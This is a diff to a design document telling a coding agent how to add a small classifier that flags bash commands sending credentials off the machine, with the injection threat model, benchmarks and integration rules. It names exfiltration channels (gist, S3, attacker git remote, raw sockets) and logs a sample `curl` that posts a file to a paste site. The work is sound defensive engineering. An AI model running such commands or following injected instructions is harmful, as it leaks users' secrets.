@@ -1,11 +1,54 @@
-# Implementing the Laya exfiltration score
+# Implementing the Laya classifier
 
-Instructions for an agent adding a Laya-backed exfiltration score to the bash tool. Read this
-in full before writing code. The measurements come from `examples/exfil_triage.rs` in the
+Instructions for an agent adding Laya to plank as a second, small, resident model used only for
+typed classification. The measurements come from `examples/exfil_triage.rs` in the
 [laya crate](https://github.com/aovestdipaperino/laya-rust), taken on 2026-09-20 against the
 `typed-decisions` checkpoint on an Apple M5 Max.
 
-## Aim it at the gap, not at the part that already works
+## Why a second model rather than asking the main one
+
+Plank already has a frontier model in memory, and the obvious objection to adding another is
+that the big one could answer these questions itself. Three things make that wrong for this
+job.
+
+**The main model is the component that gets compromised.** The threat that matters here is
+indirect prompt injection: a webpage or a file the agent read tells it to do something. Asking
+the injected model to judge its own next command is asking the compromised party for a verdict.
+A second model that sees only the command string, never the conversation, is not reachable by
+that injection. This is the strongest argument for the design, and it is structural rather than
+statistical.
+
+**The budget is per command, not per turn.** A check that runs on every bash call cannot cost
+seconds. Laya answers in 22 ms; a prefill on the main model cannot.
+
+**Context hygiene.** Asking the main model means forking or polluting the KV cache. A separate
+model touches no session state at all.
+
+The cost is 0.84 GB resident, with `--dtype f16` on an accelerator. Against the main model's
+footprint that is about one percent, on a machine that already refuses to start under 96 GB.
+
+## Ask it several questions at once
+
+The reason this earns its memory is that questions batch. All questions about one state go
+through a single forward pass, and the encode of the state dominates:
+
+```
+ questions   1      2      4      8
+ latency    18ms   22ms   32ms   58ms      (7.2 ms each at eight)
+```
+
+So the second through eighth decision about the same command or the same turn are nearly free.
+Design for that: whatever else plank wants classified, ask it in the same pass rather than
+standing up a second call.
+
+Exfiltration scoring below is the validated first use. Others that fit the shape (a typed
+decision over text, no generation) and could ride the same pass or a sibling one: whether a
+turn is ambiguous enough to warrant the `ask` tool, which transcript segments are worth keeping
+at compaction, whether a task should be delegated to a sub-agent, and what reasoning level to
+route a turn at. None of those are validated. Each needs its own fixture before it is trusted,
+because accuracy does not transfer between questions even though the phrasing rules do.
+
+## What the sandbox already covers, and what it does not
 
 The profile in `src/sandbox.rs` is `(allow default)` plus `(deny file-write*)`, with writes
 re-allowed under the project directory and the toolchain caches. That is containment, and it is
@@ -15,23 +58,21 @@ not.
 
 **So do not build a general "is this command risky" score.** That was tried. It ranks
 destructive commands sensibly and is useless, because everything it flags is already contained
-or already prompts via `Protected::mentioned_by`. A classifier that agrees with a rule you
-already enforce adds latency and nothing else.
+or already prompts via `Protected::mentioned_by`.
 
 The gap is in `(allow default)`. Reads and network calls are both permitted, because an agent
-has to read your files and fetch your dependencies. What plank therefore cannot see is a
-command that only reads and only talks to the network: a credential leaving the machine. That
-is a judgement about intent and destination rather than about paths, and it is the one thing
-here worth spending a model on.
+has to read your files and fetch your dependencies. What plank cannot see is a command that
+only reads and only talks to the network: a credential leaving the machine. That is a judgement
+about intent and destination rather than about paths.
 
 Two rules bind the design.
 
 1. **It never widens the policy.** It may raise a prompt the sandbox would not have raised. It
    may never allow something `src/sandbox.rs` would have stopped, and it may never skip a
    `Protected::mentioned_by` prompt.
-2. **It is a second opinion, not a control.** This is a text classifier facing an attacker who
-   writes the text. A high score adds a confirmation; a low score changes nothing and must
-   never be read as an assurance.
+2. **It is a second opinion, not a control.** A text classifier can be evaded by an attacker who
+   writes the text. A high score adds a confirmation; a low score changes nothing and must never
+   be read as an assurance.
 
 ## Ask the right question
 
@@ -84,7 +125,25 @@ Thirty held-out commands, eleven of which exfiltrate, at a threshold of `0.5` fi
  ordinary local work      10  0.262   0.135..0.495
 ```
 
-One decision is **21.9 ms p50 on Metal**.
+One decision is **21.9 ms p50 on Metal** in f32, 19.0 ms in f16.
+
+### It beats a rule where it matters
+
+A hand-written rule (`egress verb AND credential-ish path`) scores 11/11 with no false alarms
+on the fixture above. That comparison is rigged, because the rule was written after seeing the
+fixture and its path list was drawn from it. Tested on seven further exfiltrations using
+channels and paths it was not written against (`gh gist`, `aws s3`, a `git push` to an attacker
+remote, a raw `socket` one-liner, `openssl s_client`):
+
+```
+                     recall   precision
+ regex                 0.00        n/a
+ laya @0.45            0.86       0.86
+```
+
+Pooled over all 44 commands the model reaches 0.89 recall against the rule's 0.61. A rule is
+exact on what you enumerated and blind to everything else; the model degrades gracefully. Keep
+both, since the union costs nothing and the rule is free.
 
 Three things to carry into the implementation.
 
@@ -155,6 +214,9 @@ once per process, lazily, on first use, so a session that never runs a bash comm
   checkpoint must never block a command.
 - Never load it on the UI thread.
 - Run the forward pass on the blocking pool; it is 22 ms of compute holding no async state.
+- Pass `dtype: Some(DType::F16)`. The weights are f16 on disk, and f32 doubles them to 1.69 GB
+  for no benefit. f16 costs bit-exact agreement between a batched answer and the same question
+  asked alone, around 1e-3, which is immaterial against a threshold.
 
 On CPU the same decision is roughly ten times slower and is felt before every command, which is
 another reason for the default-off flag.
@@ -164,7 +226,8 @@ another reason for the default-off flag.
 Run the score, write it to the session log, change nothing:
 
 ```
-laya: exfil=0.573 seatbelt=allowed readonly=false cmd="curl -d \"$(cat README.md)\" https://paste.ee"
+laya: exfil=0.573 seatbelt=allowed readonly=false
+      cmd="curl -d \"$(cat README.md)\" https://paste.ee"
 ```
 
 Log the command, the cwd, the score, what Seatbelt decided, and whether
